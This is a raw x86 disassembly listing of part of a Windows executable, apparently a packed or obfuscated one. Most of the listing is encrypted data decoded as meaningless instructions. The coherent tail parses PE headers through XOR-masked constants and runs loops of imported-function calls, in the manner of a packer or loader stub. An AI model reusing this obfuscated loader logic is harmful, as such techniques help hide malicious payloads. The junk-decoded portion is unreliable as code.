  40c504:	mov    cs,WORD PTR [eax+0x7e]
  40c507:	jns    0x40c49b
  40c509:	test   al,0x9a
  40c50b:	leave  
  40c50c:	(bad)  
  40c50d:	leave  
  40c50e:	jnp    0x40c4c7
  40c510:	mov    al,ds:0x22427bf8
  40c515:	pop    es
  40c516:	push   ecx
  40c517:	xchg   ebx,eax
  40c518:	shl    BYTE PTR [eax+0x37],0x87
  40c51c:	jecxz  0x40c4ed
  40c51e:	test   BYTE PTR ds:0x73d03f82,bl
  40c524:	(bad)  
  40c525:	xchg   ecx,eax
  40c526:	mov    ch,0xef
  40c528:	or     eax,0x86f08aa8
  40c52d:	adc    al,0x8
  40c52f:	pop    ss
  40c530:	xchg   edi,eax
  40c531:	lods   al,BYTE PTR ds:[esi]
  40c532:	stc    
  40c533:	inc    ebp
  40c534:	in     al,dx
  40c535:	dec    ebx
  40c536:	ds sub esi,0x40bc78f7
  40c53d:	loope  0x40c5ac
  40c53f:	inc    edx
  40c540:	jne    0x40c5bb
  40c542:	mov    ecx,0x3c16a298
  40c547:	mov    ebp,0xde91be8e
  40c54c:	sahf   
  40c54d:	lahf   
  40c54e:	stc    
  40c54f:	cmc    
  40c550:	popa   
  40c551:	push   0xffffffe4
  40c553:	data16 jo 0x40c4f5
  40c556:	ror    BYTE PTR [ecx-0x68f0a364],cl
  40c55c:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c55e:	aas    
  40c55f:	mov    eax,0xaa59ab18
  40c564:	sbb    DWORD PTR [ebp-0x6e],ebx
  40c567:	test   al,0xb7
  40c569:	(bad)  
  40c56a:	clc    
  40c56b:	scas   eax,DWORD PTR es:[edi]
  40c56c:	push   ebx
  40c56d:	outs   dx,BYTE PTR ds:[esi]
  40c56e:	inc    esi
  40c56f:	mov    bl,0xd7
  40c571:	sbb    BYTE PTR [esi+0x6d704ae1],0x38
  40c578:	cmp    al,0xc6
  40c57a:	test   BYTE PTR [ecx-0x6b69013],dh
  40c580:	xor    al,0xf3
  40c582:	inc    ebx
  40c583:	pop    eax
  40c584:	push   esp
  40c585:	cli    
  40c586:	xor    DWORD PTR [esi+0x66e15354],esp
  40c58c:	dec    ecx
  40c58d:	into   
  40c58e:	imul   edi,ecx,0xf64a1f49
  40c594:	(bad)  
  40c595:	sub    edx,DWORD PTR [ecx-0x73]
  40c598:	and    eax,0xdab0d35f
  40c59d:	dec    esp
  40c59e:	lods   eax,DWORD PTR ds:[esi]
  40c59f:	jmp    0x57cc3dca
  40c5a4:	js     0x40c58c
  40c5a6:	fdiv   QWORD PTR [edi+0x67c200a3]
  40c5ac:	sub    BYTE PTR [edx+0x762af424],0xc5
  40c5b3:	push   edi
  40c5b4:	push   eax
  40c5b5:	xchg   ebp,eax
  40c5b6:	stos   DWORD PTR es:[edi],eax
  40c5b7:	and    cl,0x94
  40c5ba:	jge    0x40c61d
  40c5bc:	push   ds
  40c5bd:	(bad)  
  40c5bf:	xchg   ecx,eax
  40c5c0:	ja     0x40c5c6
  40c5c2:	(bad)  
  40c5c3:	lea    esp,[esp+eax*4-0x66ae2e46]
  40c5ca:	lds    ecx,FWORD PTR ds:0x4d421b88
  40c5d0:	shl    DWORD PTR [ebx],1
  40c5d2:	(bad)
  40c5d7:	sub    ebp,ecx
  40c5d9:	lock cld 
  40c5db:	repz fidivr WORD PTR [ecx-0x4261304f]
  40c5e2:	mov    edi,0xad04d5da
  40c5e7:	pop    ss
  40c5e8:	ror    BYTE PTR [edi+eiz*8],1
  40c5eb:	jo     0x40c5a4
  40c5ed:	or     bh,0xba
  40c5f0:	ins    BYTE PTR es:[edi],dx
  40c5f1:	data16 jns 0x40c5bb
  40c5f4:	pusha  
  40c5f5:	cmp    BYTE PTR [ecx],cl
  40c5f7:	rcr    esi,0xc2
  40c5fa:	sub    eax,0xbe161951
  40c5ff:	into   
  40c600:	push   ds
  40c601:	daa    
  40c602:	outs   dx,BYTE PTR ds:[esi]
  40c603:	fs cdq 
  40c605:	pop    es
  40c606:	and    al,0x90
  40c608:	enter  0x8a1,0x32
  40c60c:	cdq    
  40c60d:	outs   dx,BYTE PTR ds:[esi]
  40c60e:	stc    
  40c60f:	xchg   esp,eax
  40c610:	lods   al,BYTE PTR ds:[esi]
  40c611:	les    ecx,FWORD PTR [ecx]
  40c613:	shr    BYTE PTR [edx-0x47fb63dc],1
  40c619:	lea    eax,[eax]
  40c61b:	mul    BYTE PTR [edi]
  40c61d:	inc    edi
  40c61e:	scas   al,BYTE PTR es:[edi]
  40c61f:	ret    
  40c620:	jmp    0x924db43c
  40c625:	iret   
  40c626:	pop    esp
  40c627:	mov    ah,0xe5
  40c629:	mov    ecx,0x19a78a3e
  40c62e:	ror    DWORD PTR [edx],1
  40c630:	xchg   BYTE PTR [ebp-0x44],ch
  40c633:	cmp    eax,0xd69728a0
  40c638:	or     esp,DWORD PTR [eax-0x6a7786cd]
  40c63e:	and    BYTE PTR [edx+esi*4],cl
  40c641:	sub    ebp,edi
  40c643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c644:	shl    cl,0x19
  40c647:	xchg   edx,eax
  40c648:	retf   
  40c649:	sub    BYTE PTR [edi+0xb32190c],bh
  40c64f:	xchg   ebp,eax
  40c650:	jae    0x40c5e0
  40c652:	(bad)  [ecx]
  40c654:	ror    esi,1
  40c656:	inc    edx
  40c657:	jno    0x40c680
  40c659:	cmp    BYTE PTR [eax-0x4e7675d8],ch
  40c65f:	and    eax,0xcfcbf1b3
  40c664:	enter  0x7d36,0x95
  40c668:	inc    esp
  40c669:	fmul   st(5),st
  40c66b:	cs pop esp
  40c66d:	or     bl,BYTE PTR [edx]
  40c66f:	sub    al,0xe2
  40c671:	or     al,0x9e
  40c673:	and    BYTE PTR [ebx+0x7d],0xb2
  40c677:	mov    cl,0x41
  40c679:	leave  
  40c67a:	in     eax,dx
  40c67b:	pop    edx
  40c67c:	lods   al,BYTE PTR ds:[esi]
  40c67d:	sbb    DWORD PTR [ecx-0x46a2bb21],ebp
  40c683:	mov    WORD PTR [eax-0x7a76a08b],cs
  40c689:	fild   QWORD PTR [ecx-0x63]
  40c68c:	data16 loope 0x40c618
  40c68f:	pop    eax
  40c690:	jge    0x40c6b1
  40c692:	(bad)  
  40c693:	mov    ds:0x94106be7,al
  40c698:	sahf   
  40c699:	dec    edx
  40c69a:	jecxz  0x40c6f0
  40c69c:	pop    ebx
  40c69d:	jl     0x40c6aa
  40c69f:	dec    DWORD PTR [edx+0x68]
  40c6a2:	(bad)  
  40c6a3:	rcl    BYTE PTR [eax+0x12],1
  40c6a6:	sbb    al,0xd5
  40c6a8:	push   es
  40c6a9:	pop    ecx
  40c6aa:	cmp    BYTE PTR [edi],dh
  40c6ac:	mov    ds:0x1d4bbf7e,al
  40c6b1:	mov    ?,WORD PTR [ebp+esi*4-0x4d]
  40c6b5:	cdq    
  40c6b6:	adc    ebp,edi
  40c6b8:	cld    
  40c6b9:	push   ds
  40c6ba:	xor    al,0x97
  40c6bc:	mov    cl,0x50
  40c6be:	lock dec ebp
  40c6c0:	push   0x41
  40c6c2:	inc    esi
  40c6c3:	pop    edi
  40c6c4:	cdq    
  40c6c5:	retf   
  40c6c6:	aas    
  40c6c7:	faddp  st(2),st
  40c6c9:	mov    DWORD PTR [ebx+0x5a],esp
  40c6cc:	xor    eax,0x1708f159
  40c6d1:	les    eax,FWORD PTR [ebx-0xb]
  40c6d4:	dec    edi
  40c6d5:	ins    BYTE PTR es:[edi],dx
  40c6d6:	pop    eax
  40c6d7:	sbb    DWORD PTR [edx-0x54],eax
  40c6da:	cli    
  40c6db:	adc    al,0x1e
  40c6dd:	nop
  40c6de:	sar    al,0x3a
  40c6e1:	(bad)  
  40c6e3:	rcr    DWORD PTR [edi+0x76],0x96
  40c6e7:	mov    dl,0x52
  40c6e9:	mov    eax,ds:0x928e426a
  40c6ee:	hlt    
  40c6ef:	das    
  40c6f0:	test   al,0xad
  40c6f2:	mov    esi,0xec07f5a3
  40c6f7:	call   0x84a3:0x2bfff779
  40c6fe:	stos   DWORD PTR es:[edi],eax
  40c6ff:	cs into 
  40c701:	mov    eax,0xc7eb79ed
  40c706:	out    dx,eax
  40c707:	loop   0x40c75f
  40c709:	pop    ebp
  40c70a:	ret    
  40c70b:	rcl    BYTE PTR [ebp-0x5e],0xd7
  40c70f:	jno    0x40c6d1
  40c711:	icebp  
  40c712:	mov    ch,0xf1
  40c714:	in     al,dx
  40c715:	retf   0x869c
  40c718:	fstp   DWORD PTR [esi+0x37599b6]
  40c71e:	enter  0xd3aa,0x87
  40c722:	out    0x79,eax
  40c724:	pusha  
  40c725:	jae    0x40c765
  40c727:	inc    ebx
  40c728:	and    eax,0x3bb660f4
  40c72d:	inc    esp
  40c72e:	addr16 mov al,ds:0x562a
  40c732:	ss add eax,0xf2b0e872
  40c738:	outs   dx,BYTE PTR ds:[esi]
  40c739:	adc    DWORD PTR [edx],esp
  40c73b:	xchg   esi,eax
  40c73c:	sub    al,0x20
  40c73e:	shl    DWORD PTR [ecx],cl
  40c740:	jne    0x40c6d3
  40c742:	jg     0x40c794
  40c744:	adc    BYTE PTR es:[edi-0x366d10e9],bh
  40c74b:	hlt    
  40c74c:	pop    ecx
  40c74d:	or     eax,0xf4bcfd18
  40c752:	aad    0x24
  40c754:	out    dx,eax
  40c755:	inc    edi
  40c756:	ins    DWORD PTR es:[edi],dx
  40c757:	inc    esp
  40c758:	dec    eax
  40c759:	in     eax,0xf0
  40c75b:	pop    es
  40c75c:	jns    0x40c7b6
  40c75e:	xchg   esp,eax
  40c75f:	je     0x40c7ac
  40c761:	loope  0x40c7bd
  40c763:	retf   0x842d
  40c766:	and    eax,0xd6d9c9a6
  40c76b:	adc    edx,DWORD PTR [edx]
  40c76d:	pusha  
  40c76e:	mov    cl,BYTE PTR [ebp+ebp*4+0x9e28e3f]
  40c775:	push   es
  40c776:	jmp    FWORD PTR [edi+eax*4]
  40c779:	fidiv  DWORD PTR [eax-0xe]
  40c77c:	fs out dx,eax
  40c77e:	add    eax,0xed91feec
  40c783:	and    cl,dh
  40c785:	mov    WORD PTR ds:0x9044ac9d,?
  40c78b:	lea    edi,[ebx]
  40c78d:	and    edi,ebp
  40c78f:	arpl   WORD PTR [ebx+edx*4-0x12],ax
  40c793:	add    WORD PTR ds:0x84ef2d85,sp
  40c79a:	and    cl,BYTE PTR [ebp-0x2bda0f18]
  40c7a0:	and    ecx,DWORD PTR [edx+0x3d61a985]
  40c7a6:	jp     0x40c820
  40c7a8:	fsub   QWORD PTR [eax]
  40c7aa:	sbb    DWORD PTR ds:0xc71a727c,ebx
  40c7b0:	(bad)  
  40c7b1:	std    
  40c7b2:	and    edi,DWORD PTR [edx+0x52f4e74c]
  40c7b8:	ja     0x40c7d9
  40c7ba:	cmp    edx,DWORD PTR [ebx]
  40c7bc:	in     al,0x2b
  40c7be:	xchg   edi,eax
  40c7bf:	xchg   ebx,eax
  40c7c0:	das    
  40c7c1:	mov    al,0x8c
  40c7c3:	enter  0xed50,0x91
  40c7c7:	mov    esi,0x8e61806
  40c7cc:	cmp    BYTE PTR [ebx-0x44],dl
  40c7cf:	sbb    ecx,ecx
  40c7d1:	cmp    eax,ecx
  40c7d3:	and    ebx,esp
  40c7d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	cdq    
  40c800:	idiv   bh
  40c802:	add    ecx,ecx
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c7ed
  40c80c:	xor    BYTE PTR [ebx-0x4595197f],0xea
  40c813:	mov    dl,0x70
  40c815:	mov    ds:0x9e8898aa,al
  40c81a:	jge    0x40c7f1
  40c81c:	bound  edi,QWORD PTR [edi]
  40c81e:	sub    bl,BYTE PTR fs:0xa9e409fc
  40c825:	dec    esi
  40c826:	mov    bh,0x1e
  40c828:	xchg   edi,eax
  40c829:	adc    esi,DWORD PTR [edi]
  40c82b:	retf   0xe6cd
  40c82e:	cmp    ecx,DWORD PTR [esi+ebx*1-0x5cb5daa8]
  40c835:	sbb    esi,eax
  40c837:	mov    esi,0xed51298e
  40c83c:	adc    eax,0x6d0a3314
  40c841:	fnstenv [eax+0x58]
  40c844:	outs   dx,BYTE PTR ds:[esi]
  40c845:	ror    ecx,cl
  40c847:	pop    ds
  40c848:	xchg   esi,eax
  40c849:	push   ds
  40c84a:	sti    
  40c84b:	out    dx,eax
  40c84c:	test   al,0xbd
  40c84e:	mov    BYTE PTR [ecx-0x6e],al
  40c851:	(bad)  
  40c852:	ins    DWORD PTR es:[edi],dx
  40c853:	gs pop es
  40c855:	jp     0x40c845
  40c857:	lock dec ebp
  40c859:	sub    DWORD PTR [ebx],0xda7be51c
  40c85f:	popa   
  40c860:	jns    0x40c8cd
  40c862:	xlat   BYTE PTR ds:[ebx]
  40c863:	xchg   ebx,eax
  40c864:	jmp    0x934d:0x989561e
  40c86b:	sbb    al,0xc0
  40c86d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c86e:	sahf   
  40c86f:	or     al,0x34
  40c871:	or     DWORD PTR [edi+0x4e],esp
  40c874:	js     0x40c88d
  40c876:	fiadd  DWORD PTR [ebx-0x76f1a08]
  40c87c:	add    al,0x8
  40c87e:	popf   
  40c87f:	push   ecx
  40c880:	mov    ds:0x748a169d,eax
  40c885:	xor    BYTE PTR [edi+0x44],0x36
  40c889:	sahf   
  40c88a:	xor    eax,0x6d1362e8
  40c88f:	test   DWORD PTR [eax+0x49],eax
  40c892:	and    cl,BYTE PTR [edi-0x4f6c622]
  40c898:	in     al,0x39
  40c89a:	ja     0x40c84e
  40c89c:	mov    cl,0x5d
  40c89e:	dec    esi
  40c89f:	mov    ch,0x33
  40c8a1:	neg    BYTE PTR [eax]
  40c8a3:	and    DWORD PTR [ecx+0x5b],0xd70f5c78
  40c8aa:	adc    al,0x98
  40c8ac:	pop    ecx
  40c8ad:	call   0x6ea:0xdf8b41c5
  40c8b4:	jo     0x40c8b4
  40c8b6:	xor    dh,BYTE PTR [esp+eiz*4+0x2144b089]
  40c8bd:	and    dl,cl
  40c8bf:	leave  
  40c8c0:	imul   ebp,DWORD PTR ds:0x4391eb49,0xfb3fb443
  40c8ca:	js     0x40c91b
  40c8cc:	shr    dh,cl
  40c8ce:	or     BYTE PTR [ecx],ch
  40c8d0:	xor    DWORD PTR [edi-0x4dd0cd1a],esp
  40c8d6:	xor    eax,0x6ffdf70e
  40c8db:	mov    eax,ds:0x7e0aa9cb
  40c8e0:	dec    edi
  40c8e1:	fdivrp st(3),st
  40c8e3:	sbb    ah,bh
  40c8e5:	enter  0xe0a6,0x8e
  40c8e9:	xor    DWORD PTR [edi],0xffffff92
  40c8ec:	test   DWORD PTR [esi+0x41],0xb03ef937
  40c8f3:	cdq    
  40c8f4:	mov    ebx,DWORD PTR [ebp+0x7d]
  40c8f7:	dec    esp
  40c8f8:	sub    eax,0xf5eb37a8
  40c8fd:	cmc    
  40c8fe:	cmp    ecx,ebp
  40c900:	mov    dl,0x78
  40c902:	outs   dx,BYTE PTR ds:[esi]
  40c903:	sub    dl,BYTE PTR [edi-0x13a69a1c]
  40c909:	adc    eax,0xd67aa780
  40c90e:	mov    edx,0xdee39ea1
  40c913:	dec    esi
  40c914:	inc    ecx
  40c915:	jg     0x40c89d
  40c917:	mov    WORD PTR [esi],es
  40c919:	ins    DWORD PTR es:[edi],dx
  40c91a:	dec    eax
  40c91b:	sbb    al,0x35
  40c91d:	xchg   ebx,eax
  40c91e:	jbe    0xd4685e03
  40c924:	adc    esi,DWORD PTR ds:0xbbf6a2a1
  40c92a:	inc    eax
  40c92b:	add    edx,DWORD PTR [ebx+0xb]
  40c92e:	pusha  
  40c92f:	addr16 xchg ecx,eax
  40c931:	sub    al,0xd8
  40c933:	mov    dl,0xf9
  40c935:	pop    ebx
  40c936:	dec    esp
  40c937:	pushf  
  40c938:	popa   
  40c939:	push   edx
  40c93a:	test   BYTE PTR [eax],bh
  40c93c:	std    
  40c93d:	shl    DWORD PTR [ecx-0x62],1
  40c940:	in     eax,0x53
  40c942:	add    al,0x9e
  40c944:	dec    ebp
  40c945:	pushf  
  40c946:	adc    eax,0x934f4fff
  40c94b:	push   0x156a11c2
  40c950:	es sbb al,0x1d
  40c953:	or     al,0x91
  40c956:	es repz mov ah,0x77
  40c95a:	pop    es
  40c95b:	add    cl,BYTE PTR [ebx+0x5b]
  40c95e:	popa   
  40c95f:	mov    ch,0x1f
  40c961:	outs   dx,DWORD PTR ds:[esi]
  40c962:	push   ds
  40c963:	dec    esp
  40c964:	mov    al,BYTE PTR [edx+0x4a45533e]
  40c96a:	out    0x80,eax
  40c96c:	fisttp QWORD PTR [ebx]
  40c96e:	sbb    BYTE PTR [ecx-0x46796f],dh
  40c974:	rol    ah,1
  40c976:	xchg   edx,eax
  40c977:	pop    esp
  40c978:	jo     0x40c9e6
  40c97a:	dec    edx
  40c97b:	and    ecx,ebx
  40c97d:	add    DWORD PTR [ecx],edi
  40c97f:	cmp    al,0xb8
  40c981:	rol    cl,1
  40c983:	or     ebx,edx
  40c985:	add    eax,0x718eb501
  40c98a:	test   DWORD PTR [ecx],esp
  40c98c:	xor    edx,DWORD PTR [ebx]
  40c98e:	mov    bh,0xe0
  40c990:	popa   
  40c991:	sahf   
  40c992:	popf   
  40c993:	test   eax,0x48bc6bf8
  40c998:	shl    BYTE PTR [ebx-0xe34905e],cl
  40c99e:	mov    BYTE PTR [esi-0x65367841],dl
  40c9a4:	out    0x87,eax
  40c9a6:	push   esp
  40c9a7:	xor    al,BYTE PTR [esi+0x1f]
  40c9aa:	ret    0x6463
  40c9ad:	cmp    edx,DWORD PTR cs:[ebx]
  40c9b0:	pop    edx
  40c9b1:	int    0xfa
  40c9b3:	xor    ebx,DWORD PTR [edx]
  40c9b5:	xor    al,0x46
  40c9b7:	mov    esi,0x3df41a41
  40c9bc:	xchg   BYTE PTR [esi-0x27],ah
  40c9bf:	jbe    0x40c98c
  40c9c1:	xchg   DWORD PTR [ebp+0x7ede5177],edi
  40c9c7:	xchg   eax,esi
  40c9c9:	mov    cr0,esi
  40c9cc:	xor    DWORD PTR [edi+0x38dcd563],edx
  40c9d2:	retf   0x92f7
  40c9d5:	xor    al,0x3
  40c9d7:	push   ds
  40c9d8:	ss pop edx
  40c9da:	ret    
  40c9db:	call   0xec6df836
  40c9e0:	gs and cl,cl
  40c9e3:	xchg   edx,eax
  40c9e4:	test   al,0x8b
  40c9e6:	retf   0xa170
  40c9e9:	ins    DWORD PTR es:[edi],dx
  40c9ea:	xchg   BYTE PTR [edx+0x1eb0fee1],bh
  40c9f0:	aaa    
  40c9f1:	outs   dx,DWORD PTR ds:[esi]
  40c9f2:	push   ebp
  40c9f3:	leave  
  40c9f4:	jp     0x40c9a2
  40c9f6:	stos   BYTE PTR es:[edi],al
  40c9f7:	js     0x40ca4f
  40c9f9:	repz pushf 
  40c9fb:	dec    eax
  40c9fc:	jg     0x40ca4f
  40c9fe:	lea    ecx,[ebx-0x7e2cabf8]
  40ca04:	cdq    
  40ca05:	mov    bh,0x7e
  40ca07:	xchg   edx,eax
  40ca08:	jle    0x40ca1b
  40ca0a:	adc    BYTE PTR [eax-0x6b],0xe0
  40ca0e:	sub    DWORD PTR [esp+edi*4+0x13],esi
  40ca12:	ins    DWORD PTR es:[edi],dx
  40ca13:	xchg   ebp,eax
  40ca14:	shl    ebx,1
  40ca16:	cmp    cl,BYTE PTR [bx+si-0x41]
  40ca1a:	jb     0x40c9d6
  40ca1c:	(bad)  
  40ca1d:	sub    BYTE PTR [ebx],dh
  40ca1f:	cld    
  40ca20:	or     DWORD PTR [edx],esp
  40ca22:	outs   dx,BYTE PTR ds:[esi]
  40ca23:	lods   al,BYTE PTR ds:[esi]
  40ca24:	ss ins DWORD PTR es:[edi],dx
  40ca26:	mov    al,ds:0x40ca920e
  40ca2b:	or     dh,BYTE PTR [ebx+eiz*1-0x3234c610]
  40ca32:	shr    ecx,0x95
  40ca35:	mov    al,ds:0xb13e255f
  40ca3a:	xor    BYTE PTR [esp+ebx*2+0x7e40165f],bh
  40ca41:	and    eax,0x74be56c1
  40ca46:	int    0x42
  40ca48:	outs   dx,DWORD PTR ds:[esi]
  40ca49:	inc    esp
  40ca4a:	aam    0x10
  40ca4c:	das    
  40ca4d:	int3   
  40ca4e:	fcom   DWORD PTR [edx-0x31]
  40ca51:	or     esp,eax
  40ca53:	out    dx,al
  40ca54:	add    al,0x52
  40ca56:	jae    0x40cad4
  40ca58:	or     edx,DWORD PTR [eax]
  40ca5a:	cld    
  40ca5b:	int3   
  40ca5c:	sti    
  40ca5d:	pop    es
  40ca5e:	addr16 inc ecx
  40ca60:	and    edi,edx
  40ca62:	mov    cl,0x3f
  40ca64:	stos   BYTE PTR es:[edi],al
  40ca65:	push   ebp
  40ca66:	and    eax,0xea3ed0b6
  40ca6b:	mov    eax,ds:0x101df845
  40ca70:	out    dx,al
  40ca71:	fwait
  40ca72:	xchg   ecx,eax
  40ca73:	shl    DWORD PTR [ebp+edi*2-0x68277cc6],cl
  40ca7a:	lods   al,BYTE PTR ds:[esi]
  40ca7b:	sbb    eax,0xc2abd9af
  40ca80:	enter  0x26cb,0xcd
  40ca84:	push   0x33
  40ca86:	jl     0x40ca6c
  40ca88:	stc    
  40ca89:	xchg   DWORD PTR [ecx-0x4d],edx
  40ca8c:	push   esi
  40ca8d:	and    al,0x64
  40ca8f:	fadd   st(2),st
  40ca91:	fs jl  0x40cac1
  40ca94:	rcl    BYTE PTR [edi-0x273c9b4b],0x74
  40ca9b:	inc    edi
  40ca9c:	fprem  
  40ca9e:	test   al,0xa6
  40caa0:	fxch   st(7)
  40caa2:	mov    cl,0xd7
  40caa4:	mov    ecx,0x45e2c1b4
  40caa9:	ds ins DWORD PTR es:[edi],dx
  40caab:	push   edi
  40caac:	loopne 0x40caff
  40caae:	jmp    0x2c469b90
  40cab3:	xor    al,0x51
  40cab5:	loope  0x40ca9b
  40cab7:	std    
  40cab8:	mov    esi,eax
  40caba:	ds test al,0x37
  40cabd:	push   0xe78f7846
  40cac2:	add    ecx,edx
  40cac4:	shr    DWORD PTR [ebx],cl
  40cac6:	bound  ebp,QWORD PTR [eax-0x295ee850]
  40cacc:	mov    ch,0x20
  40cace:	mov    eax,ds:0x7135967e
  40cad3:	sahf   
  40cad4:	mov    ds:0x43c2d0ab,eax
  40cad9:	fist   WORD PTR [ebp+0x5a]
  40cadc:	xchg   ecx,eax
  40cadd:	das    
  40cade:	gs or  ebx,edi
  40cae1:	inc    ecx
  40cae2:	dec    edx
  40cae3:	and    eax,0xa39d3d2d
  40cae8:	fs adc al,0x99
  40caeb:	or     DWORD PTR [edx-0x33a9aa66],eax
  40caf1:	push   edi
  40caf2:	fisub  DWORD PTR [ebp-0x59]
  40caf5:	mov    al,ds:0xa8b759cb
  40cafa:	lds    esp,FWORD PTR [eax-0x2550be89]
  40cb00:	gs inc esp
  40cb02:	sub    DWORD PTR [esi-0x58dccca8],edi
  40cb08:	fdiv   DWORD PTR [ebp+edx*1+0x6e]
  40cb0c:	retf   
  40cb0d:	xlat   BYTE PTR gs:[ebx]
  40cb0f:	ret    
  40cb10:	scas   eax,DWORD PTR es:[edi]
  40cb11:	icebp  
  40cb12:	jge    0x40cae1
  40cb14:	jle    0x40cb13
  40cb16:	fld    QWORD PTR [eax-0x780580a2]
  40cb1c:	push   cs
  40cb1d:	test   eax,0xa75c6a39
  40cb22:	xchg   edi,eax
  40cb23:	xchg   ebx,eax
  40cb24:	pop    edx
  40cb25:	mov    edi,0xd20bd6e2
  40cb2a:	(bad)  
  40cb2b:	mov    cl,0x0
  40cb2d:	sub    DWORD PTR [esi-0x21],ebx
  40cb30:	sahf   
  40cb31:	ror    BYTE PTR [ebx],cl
  40cb33:	xchg   esp,eax
  40cb34:	ficom  DWORD PTR [edi+ecx*4]
  40cb37:	jno    0x40caed
  40cb39:	xchg   ebp,eax
  40cb3a:	inc    esp
  40cb3b:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430355,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430355
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430355,eax
  40cbe0:	cmp    DWORD PTR ds:0x430355,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430355,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e90b
  40cc05:	cmp    DWORD PTR ds:0x430355,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430355
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430355,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43033d,0x0
  40cc2f:	mov    eax,ds:0x43033d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43033d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43033d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e817
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e9cb
  40cc6b:	cmp    DWORD PTR ds:0x43033d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
  40ccad:	pop    esi
  40ccae:	je     0x40ccbc
  40ccb4:	mov    eax,DWORD PTR [ebp+0x8]
  40ccb7:	jmp    0x40ccd5
  40ccbc:	mov    eax,DWORD PTR [ebp-0x4]
  40ccbf:	xor    eax,edx
  40ccc1:	add    eax,ecx
  40ccc3:	jmp    0x40ccd5
  40ccc8:	mov    eax,DWORD PTR [ebp-0x4]
